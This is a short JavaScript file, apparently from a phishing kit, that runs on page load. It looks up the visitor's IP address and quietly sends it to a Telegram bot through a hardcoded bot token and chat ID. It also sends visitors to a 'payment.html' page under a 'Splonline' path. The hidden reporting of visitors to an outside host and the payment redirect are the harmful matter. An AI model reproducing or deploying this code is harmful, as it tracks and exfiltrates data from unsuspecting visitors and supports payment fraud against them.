function getIpAddress() {
    return fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error("Error getting IP address:", error);
            return "Unknown";
        });
}

function botNotify(message) {
    const token = "6604401786:AAEeMzh1x_IBQGtbCtAkb6lRi5UyhF25MDM"; // Replace with your actual bot token
    const apiUrl = "https://api.telegram.org/bot";
    
    getIpAddress().then(clientIp => {
        const queryParams = {
            "text": message + "\nClient IP Address: " + clientIp,
            "chat_id": "6564242483"
        };

        const queryString = Object.keys(queryParams)
            .map(key => encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key]))
            .join("&");

        const link = `${apiUrl}${token}/sendMessage?${queryString}`;

        fetch(link)
            .then(response => {
                return response.json();
            })
            .then(data => {
                // Do something with the response data
            })
            .catch(error => {
                console.error("Fetch error:", error);
            });
    });
}

// Redirect to payment.html on button click
const button1 = document.getElementById("button1");
if (button1) {
    button1.addEventListener("click", () => {
        window.location.href = "/Splonline_static/Splonline_static/html/payment.html";
    });
}

// Call botNotify function when needed
const messageToSend = "Start....";
botNotify(messageToSend);
